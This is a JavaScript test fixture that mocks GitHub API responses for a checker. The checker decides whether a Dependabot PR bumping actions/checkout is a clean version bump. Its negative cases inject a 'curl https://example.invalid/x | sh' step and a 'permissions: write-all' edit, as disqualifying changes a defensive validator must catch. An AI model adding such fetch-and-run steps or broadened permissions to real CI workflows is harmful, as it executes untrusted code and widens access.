export const head = '1'.repeat(40);
const base = '2'.repeat(40);
const mergeBase = '3'.repeat(40);
const blob = '4'.repeat(40);
const release = 'a'.repeat(40);
const repo = 'repos/axatbhardwaj/axstack';
const file = '.github/workflows/ci.yml';

export function fixture(input = {}) {
  const selected = input.headIndex ? String(input.headIndex + 5).repeat(40) : head;
  const pr = {
    number: 1,
    state: 'open',
    user: { id: 49699333, login: input.author ?? 'dependabot[bot]', type: 'Bot' },
    head: { ref: input.branch ?? 'dependabot/github_actions/actions/checkout-7', sha: selected },
    base: { repo: { full_name: input.baseRepo ?? 'axatbhardwaj/axstack' }, sha: base },
    title: input.title ?? 'Bump actions/checkout from 6 to 7.0.0',
    body: input.body ?? null,
    changed_files: input.changedFiles ?? 1,
    commits: input.priorCommitAuthor ? 2 : 1,
  };
  const path = input.filename ?? file;
  let reads = 0;
  const files = [
    {
      filename: path,
      sha: blob,
      status: input.fileStatus ?? (input.oldFilename ? 'renamed' : 'modified'),
      ...(input.oldFilename ? { previous_filename: input.oldFilename } : {}),
    },
  ];
  const checks = input.checks ?? [
    {
      id: 1,
      head_sha: selected,
      status: input.checkStatus ?? 'completed',
      conclusion: input.conclusion ?? 'success',
    },
  ];
  const runs = input.runs ?? [
    { id: 1, name: 'ci', head_sha: input.runHead ?? selected, status: input.runStatus ?? 'completed' },
  ];
  const statuses = input.statuses ?? [];
  return async (endpoint) => {
    const [route, query] = endpoint.split('?');
    const parameters = new URLSearchParams(query);
    const ok = (body, link = '') => ({ status: 200, link, body });
    switch (route) {
      case repo + '/pulls':
        if (input.gap)
          return parameters.get('page') === '1'
            ? ok([pr], `<https://api.github.com/${repo}/pulls?state=open&per_page=100&page=2>; rel="next"`)
            : { status: 502 };
        return ok(input.pulls ?? [pr]);
      case repo + '/pulls/1':
        return ok(++reads > 1 && input.moved ? { ...pr, head: { ...pr.head, sha: 'e'.repeat(40) } } : pr);
      case repo + '/pulls/1/files':
        return ok(files);
      case repo + '/pulls/1/commits':
        return ok([
          ...(input.priorCommitAuthor
            ? [
                {
                  sha: '9'.repeat(40),
                  author: { login: input.priorCommitAuthor },
                  commit: { message: 'Earlier commit' },
                },
              ]
            : []),
          {
            sha: selected,
            author: input.commitAuthor === null ? null : { login: input.commitAuthor ?? 'dependabot[bot]' },
            commit: { message: input.commit ?? 'Update action' },
          },
        ]);
      case repo + '/compare/' + base + '...' + selected:
        return ok({ merge_base_commit: { sha: mergeBase } });
      case repo + '/contents/' + path: {
        const baseSide = parameters.get('ref') === mergeBase;
        const content = baseSide
          ? (input.baseWorkflow ?? workflow('v6'))
          : (input.headWorkflow ?? workflow(input.pin ?? release));
        return ok({
          type: 'file',
          encoding: 'base64',
          sha: blob,
          content: btoa(content),
        });
      }
      case repo + '/commits/' + selected + '/check-runs':
        return ok({ check_runs: checks, total_count: input.checkTotal ?? checks.length });
      case repo + '/commits/' + selected + '/statuses':
        return ok(statuses);
      case repo + '/actions/workflows/ci.yml/runs':
        return ok({ workflow_runs: runs, total_count: runs.length });
      case 'repos/actions/checkout/releases':
        return ok(input.releases ?? [{ tag_name: 'v7.0.0', draft: false, published_at: '2026-11-01T00:00:00Z' }]);
      case 'repos/actions/checkout/git/ref/tags/v7':
      case 'repos/actions/checkout/git/ref/tags/v7.0.0':
        return input.tagUnknown
          ? { status: 403 }
          : ok({
              ref: 'refs/tags/' + route.split('/').at(-1),
              object: { type: 'commit', sha: route.endsWith('/v7') ? (input.aliasSha ?? release) : release },
            });
      default:
        throw new Error('unexpected fixture endpoint ' + endpoint);
    }
  };
}

const workflow = (ref) => `jobs:
  lint:
    steps:
      - uses: actions/checkout@${ref}
`;
const script = '      - run: curl https://example.invalid/x | sh\n';

export const nonBumps = [
  { name: 'zero changed refs', forge: { headWorkflow: workflow('v6') }, term: 'versionBump' },
  { name: 'run-only edit', forge: { headWorkflow: workflow('v6') + script }, term: 'versionBump' },
  { name: 'pin plus run edit', forge: { headWorkflow: workflow(release) + script }, term: 'versionBump' },
  {
    name: 'pin plus with edit',
    forge: {
      baseWorkflow: workflow('v6') + '        with: {persist-credentials: false}\n',
      headWorkflow: workflow(release) + '        with: {persist-credentials: true}\n',
    },
    term: 'versionBump',
  },
  {
    name: 'pin plus env edit',
    forge: { headWorkflow: 'env: {MODE: changed}\n' + workflow(release) },
    term: 'versionBump',
  },
  {
    name: 'pin plus permissions edit',
    forge: { headWorkflow: 'permissions: write-all\n' + workflow(release) },
    term: 'versionBump',
  },
  {
    name: 'pin plus trailing permissions deletion',
    forge: {
      baseWorkflow: workflow('v6') + 'permissions:\n  contents: read\n',
      headWorkflow: workflow(release).trimEnd(),
    },
    term: 'versionBump',
  },
  {
    name: 'pin plus comment-only edit',
    forge: { headWorkflow: '# changed comment\n' + workflow(release) },
    term: 'versionBump',
  },
  {
    name: 'pin plus uses-like scalar edit',
    forge: {
      baseWorkflow: workflow('v6') + '      - run: |\n          uses: actions/checkout@v6\n',
      headWorkflow: workflow(release) + '      - run: |\n          uses: actions/checkout@' + release + '\n',
    },
    term: 'versionBump',
  },
  {
    name: 'action substitution',
    forge: { baseWorkflow: workflow('v6').replace('actions/checkout', 'actions/cache') },
    term: 'versionBump',
  },
  { name: 'removed workflow file', forge: { fileStatus: 'removed' }, term: 'versionBump' },
  { name: 'added workflow file', forge: { fileStatus: 'added' }, term: 'versionBump' },
  { name: 'non-bot head commit', forge: { commitAuthor: 'octocat' }, term: 'commitAuthors' },
  { name: 'earlier non-bot commit', forge: { priorCommitAuthor: 'octocat' }, term: 'commitAuthors' },
];
